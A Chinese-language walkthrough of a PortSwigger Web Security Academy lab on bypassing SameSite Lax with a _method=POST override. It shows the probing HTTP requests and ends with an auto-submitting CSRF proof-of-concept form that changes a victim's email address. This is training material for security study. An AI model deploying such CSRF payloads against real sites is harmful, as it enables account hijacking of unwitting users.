# 实验：通过方法覆盖（method override）绕过 SameSite Lax

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

本实验的修改邮箱功能易受 CSRF 攻击。为了解决本实验，请执行一个 CSRF 攻击以修改受害者的邮箱地址。你应该使用提供的漏洞利用服务器（exploit server）来托管你的攻击代码。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 不同浏览器的默认 SameSite 限制有所不同。由于受害者使用的是 Chrome，我们也建议你使用 Chrome（或 Burp 内置的 Chromium 浏览器）来测试你的利用程序。

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

探测
- 使用邮件修改功能

    ```http
    POST /my-account/change-email HTTP/2
    Cookie: session=p24rvkXKZMBRoNoRfuWeuwxogO1EOUxO

    email=a%40b
    ```

    - 无 csrf 令牌防护

- 转换邮件修改功能的请求方法
    ```http
    GET /my-account/change-email?email=a%40b HTTP/2
    ```

    - 失败
        ```http
        HTTP/2 405 Method Not Allowed
        Allow: POST
        ```

- 由于 lux 限制下，仅 GET 可携带 cookie。尝试对 GET 请求进行方法覆盖
    ```http
    GET /my-account/change-email?email=a%40b&_method=POST HTTP/2
    ```
    - 成功

攻击
- 对方法覆盖请求使用 burp csrf poc 功能
    ```html
        <html>
        <!-- CSRF PoC - generated by Burp Suite Professional -->

        <body>
            <form action="https://lab-id.web-security-academy.net/my-account/change-email">
                <input type="hidden" name="email" value="azzzzz&#64;b" />
                <input type="hidden" name="&#95;method" value="POST" />
                <input type="submit" value="Submit request" />
            </form>
            <script>
                history.pushState('', '', '/');
                document.forms[0].submit();
            </script>
        </body>

        </html>
        ```
